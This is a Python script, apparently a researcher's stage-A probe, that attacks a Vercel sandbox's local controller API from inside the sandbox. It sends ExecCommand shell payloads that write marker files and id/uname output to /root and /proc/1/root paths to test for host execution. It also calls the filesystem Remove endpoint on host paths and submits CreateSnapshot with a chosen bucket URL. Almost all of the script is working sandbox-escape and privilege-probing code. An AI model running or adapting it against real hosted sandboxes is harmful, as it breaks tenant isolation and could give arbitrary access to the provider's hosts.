# -*- coding: utf-8 -*-
"""v188 阶段A: 沙箱用户视角 - ExecCommand 宿主执行决定性验证
命令写特征文件到多个路径, guest 阶段从宿主视角全面检查"""
import socket, json, os, time

OUT = '/vercel/sandbox/v188u.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')


def log(s, maxlen=2000):
    s = str(s)
    if len(s) > maxlen:
        s = s[:maxlen] + '...[TRUNC]'
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def tcp(port, path, body, t=5):
    b = json.dumps(body).encode()
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(('127.0.0.1', port))
        hdrs = 'POST %s HTTP/1.1\r\nHost: x\r\nContent-Type: application/json\r\n' % path
        hdrs += 'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\nConnection: close\r\n\r\n' % len(b)
        s.sendall(hdrs.encode() + b)
        d = b''
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                d += c
                if len(d) > 5000:
                    break
        except Exception:
            pass
        s.close()
        st = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        return st, d[:4000]
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b''


CTRL = 'vercel.sandbox.api.controller.v1.ControllerService'
FS = 'vercel.sandbox.api.controller.v1.FileSystemService'

log('=== 1 ExecCommand multi-path ===')
marker = 'PWN188_' + str(int(time.time() * 1000))[-8:]
log('MARKER=%s' % marker)
# 写多个路径, 覆盖宿主/沙箱所有可能
payload = ('echo %s > /tmp/out188.txt 2>&1; id >> /tmp/out188.txt; hostname >> /tmp/out188.txt; '
           'cat /etc/hostname >> /tmp/out188.txt 2>&1; uname -a >> /tmp/out188.txt; '
           'echo X > /vercel/sandbox/out188.txt 2>&1; id >> /vercel/sandbox/out188.txt; '
           'echo Y > /root/out188.txt 2>&1; id >> /root/out188.txt; '
           'echo Z > /proc/1/root/tmp/out188.txt 2>&1; id >> /proc/1/root/tmp/out188.txt; '
           'ls -la /proc/1/root/ 2>&1 | head -5 >> /tmp/out188.txt; '
           'echo DONE188 >> /tmp/out188.txt') % marker
body = {'command': '/bin/sh', 'args': ['-c', payload]}
st, pay = tcp(23456, '/' + CTRL + '/ExecCommand', body, t=6)
log('EC %s -> %s %r' % (json.dumps(body)[:120], st, pay[:600]))
cid = None
try:
    cid = json.loads(pay.split(b'\r\n\r\n', 1)[1].decode(errors='replace')).get('commandId')
    log('CID=%s' % cid)
except Exception as e:
    log('PARSE %s' % e)

time.sleep(3)

log('=== 2 WaitCommand after delay ===')
if cid:
    st, pay = tcp(23456, '/' + CTRL + '/WaitCommand', {'commandId': cid}, t=6)
    log('WC -> %s %r' % (st, pay[:800]))
    st, pay = tcp(23456, '/' + CTRL + '/KillCommand', {'commandId': cid}, t=4)
    log('KC -> %s %r' % (st, pay[:400]))

log('=== 3 sandbox view files ===')
for p in ['/tmp/out188.txt', '/vercel/sandbox/out188.txt', '/root/out188.txt',
          '/proc/1/root/tmp/out188.txt']:
    try:
        d = open(p, 'r', encoding='utf-8', errors='replace').read()
        log('SFILE %s (%d): %r' % (p, len(d), d[:1200]))
    except Exception as e:
        log('SFILE %s EXC %s' % (p, e))

log('=== 4 Remove host path test ===')
# 用 ExecCommand 在宿主创建特征文件再尝试 Remove (如果两者都作用于宿主 => 宿主任意读写)
# 先确保宿主 /tmp 有文件可删
payload2 = ('echo RMTEST188 > /tmp/v188rm_host.txt 2>&1; '
            'echo RMTEST188 > /proc/1/root/tmp/v188rm_host2.txt 2>&1; '
            'ls -la /tmp/v188rm_host.txt /proc/1/root/tmp/v188rm_host2.txt 2>&1')
st, pay = tcp(23456, '/' + CTRL + '/ExecCommand', {'command': '/bin/sh', 'args': ['-c', payload2]}, t=6)
log('EC2 -> %s %r' % (st, pay[:400]))
time.sleep(2)
for path in ['/tmp/v188rm_host.txt', '/proc/1/root/tmp/v188rm_host2.txt']:
    st, pay = tcp(23456, '/' + FS + '/Remove', {'path': path}, t=3)
    log('RM %s -> %s %r' % (path, st, pay[:300]))
    time.sleep(0.3)

log('=== 5 CreateSnapshot bucketBaseUrl ===')
for body in [{'driveId': 'sandbox', 'bucketBaseUrl': 'http://127.0.0.1:9/x'},
             {'driveId': 'sandbox', 'bucketBaseUrl': 'http://127.0.0.1:9/x', 'snapshotId': 'test'}]:
    st, pay = tcp(23456, '/' + CTRL + '/CreateSnapshot', body, t=4)
    log('CS %s -> %s %r' % (json.dumps(body)[:110], st, pay[:400]))
    time.sleep(0.3)

log('V188U_DONE')
f.close()
